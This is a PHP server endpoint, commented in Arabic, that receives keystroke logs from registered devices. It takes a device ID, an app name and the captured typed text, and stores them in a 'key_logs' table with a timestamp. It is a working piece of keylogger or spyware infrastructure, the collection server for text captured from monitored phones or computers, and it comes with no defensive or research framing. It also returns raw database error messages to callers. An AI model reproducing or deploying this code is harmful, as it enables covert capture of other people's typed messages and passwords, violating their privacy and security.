<?php
// إجبار السيرفر على إرسال استجابة بصيغة JSON
header("Content-Type: application/json; charset=UTF-8");

// استدعاء ملف الاتصال الموحد (الخروج للمجلد الرئيسي)
include '../db_config.php';

// التأكد من أن الطلب قادم عبر POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode([
        "status" => "error",
        "message" => "طريقة الطلب غير مسموح بها. استخدم POST فقط."
    ]);
    exit;
}

// استقبال البيانات القادمة من التطبيق
$device_uid = isset($_POST['device_uid']) ? trim($_POST['device_uid']) : null;
$app_name = isset($_POST['app_name']) ? trim($_POST['app_name']) : null;
$typed_text = isset($_POST['typed_text']) ? trim($_POST['typed_text']) : null;

// التحقق من اكتمال البيانات الأساسية
if (empty($device_uid) || empty($typed_text)) {
    echo json_encode([
        "status" => "error",
        "message" => "المعطيات ناقصة: device_uid و typed_text مطلوبة."
    ]);
    exit;
}

try {
    // جلب الـ id الرقمي الخاص بالجهاز
    $stmt_device = $conn->prepare("SELECT id FROM devices WHERE device_unique_id = :uid LIMIT 1");
    $stmt_device->execute([':uid' => $device_uid]);
    $device = $stmt_device->fetch();

    if (!$device) {
        echo json_encode([
            "status" => "error",
            "message" => "خطأ: هذا الجهاز غير مسجل في النظام مسبقاً."
        ]);
        exit;
    }

    $device_id = $device['id'];

    // إدخال البيانات في جدول key_logs
    $sql = "INSERT INTO key_logs (device_id, app_name, typed_text, created_at) 
            VALUES (:device_id, :app_name, :typed_text, NOW())";
            
    $stmt_insert = $conn->prepare($sql);
    $stmt_insert->execute([
        ':device_id'  => $device_id,
        ':app_name'   => $app_name,
        ':typed_text' => $typed_text
    ]);

    echo json_encode([
        "status" => "success",
        "message" => "تم حفظ ضغطات الكيبورد بنجاح وربطها بالجهاز."
    ]);

} catch (PDOException $e) {
    echo json_encode([
        "status" => "error",
        "message" => "خطأ في قاعدة البيانات: " . $e->getMessage()
    ]);
}
?>
